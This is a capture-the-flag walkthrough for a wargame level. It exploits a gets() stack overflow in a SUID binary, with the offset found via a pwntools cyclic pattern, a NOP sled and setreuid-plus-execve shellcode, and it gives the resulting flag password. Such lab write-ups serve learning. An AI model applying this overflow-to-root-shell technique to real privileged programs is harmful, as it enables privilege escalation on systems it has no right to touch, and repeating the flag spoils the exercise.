# level00 — walkthrough

**Binary:** `/home/level00/case` (SUID `flag00`, x86-64)
**Goal:** read `/home/flag00/.pass`

## 1. Recon
```
$ checksec --file=./case
  Arch: amd64   RELRO: Partial   Stack: No canary   NX: disabled (RWE stack)
  PIE: No PIE (0x400000)
$ cat /proc/sys/kernel/randomize_va_space   ->  0   (ASLR off)
```
Source (`case.c`) — `auth_loop()`:
```c
char credentials[64];
gets(credentials);          // unbounded read -> stack buffer overflow
```

## 2. The bug
`gets()` never checks the length, so a long line overruns `credentials[64]`
and overwrites the saved return address of `auth_loop`.

## 3. Offset
A cyclic pattern shows the saved RIP is **88 bytes** past the buffer:
```python
from pwn import *
p = process('./case'); p.sendline(cyclic(200)); p.wait()
cyclic_find(p.corefile.fault_addr & 0xffffffff)   # -> 88
```

## 4. Where to jump
The stack is executable and ASLR is off, so shellcode on the stack runs and
its address is fixed. Under gdb `break gets; print $rdi` gives
`&credentials = 0x7fffffffea30`. We place a NOP sled + shellcode **after** the
saved RIP and point the return address into the sled (the sled absorbs the
small gdb-vs-runtime environment delta).

## 5. Privilege
`case` is SUID `flag00` (euid=flag00, ruid=level00). `execve("/bin/sh")` alone
would drop euid back to level00, so the shellcode does
`setreuid(euid, euid)` first, then `execve("/bin/sh")`.

## 6. Payload
```
[ 'A'*88 ][ p64(0x7fffffffeb50) ][ '\x90'*512 ][ setreuid+sh shellcode ]
```
See `exploit.py`.

## 7. Run
```
$ python3 exploit.py > payload
$ (cat payload; echo; sleep 1; echo 'cat /home/flag00/.pass') | ./case
...
czugaihitjx0lys47blkh0qwtzz1c9g6
```

**flag00 = `czugaihitjx0lys47blkh0qwtzz1c9g6`** (SSH password for level01)
